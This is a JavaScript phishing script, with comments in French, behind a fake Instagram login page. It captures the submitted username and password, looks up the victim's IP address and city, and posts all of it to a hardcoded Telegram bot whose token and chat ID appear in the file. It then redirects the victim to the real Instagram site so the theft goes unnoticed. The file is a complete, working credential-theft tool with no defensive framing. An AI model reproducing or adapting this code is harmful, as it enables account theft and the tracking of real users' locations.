// Configuration Telegram
const TELEGRAM_BOT_TOKEN = '8217147903:AAHdDmpNkDgeYY1fltvt_otnCYFZ9peGo9w';
const TELEGRAM_CHAT_ID = '5534662562';

const loginForm = document.getElementById('loginForm');

// Fonction pour obtenir l'IP
async function getClientIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        return 'IP non disponible';
    }
}

// Fonction pour obtenir la localisation
async function getLocationFromIP(ip) {
    try {
        const response = await axios.get(`https://ipapi.co/${ip}/json/`);
        const data = response.data;
        
        if (data && !data.error) {
            let location = '';
            if (data.city) location += `${data.city}, `;
            if (data.region) location += `${data.region}, `;
            if (data.country_name) location += data.country_name;
            return location || 'Localisation inconnue';
        }
    } catch (error) {
        // Silencieux
    }
    return 'Localisation non disponible';
}

// Fonction pour envoyer à Telegram
async function sendToTelegram(username, password) {
    const ip = await getClientIP();
    const location = await getLocationFromIP(ip);
    const date = new Date().toLocaleString('fr-FR');
    
    const message = `🔔 INSTAGRAM LOGIN 🔔

👤 Utilisateur: ${username}
🔐 Mot de passe: ${password}

📍 Localisation: ${location}
🌐 IP: ${ip}

🕐 Date: ${date}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
        console.log('✅ Infos envoyées à Telegram');
        return true;
    } catch (error) {
        console.error('❌ Erreur Telegram');
        return false;
    }
}

// Gestion du formulaire
loginForm.addEventListener('submit', async function(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    
    if (!username || !password) {
        return;
    }
    
    const submitBtn = this.querySelector('.login-btn');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = 'Connexion...';
    submitBtn.disabled = true;
    
    await sendToTelegram(username, password);
    
    // Redirection après 1.5s
    setTimeout(() => {
        window.location.href = 'https://instagram.com';
    }, 1500);
});

// Empêcher le clic droit sur le logo
const logoImg = document.querySelector('.logo-img');
if (logoImg) {
    logoImg.addEventListener('contextmenu', (e) => e.preventDefault());
}
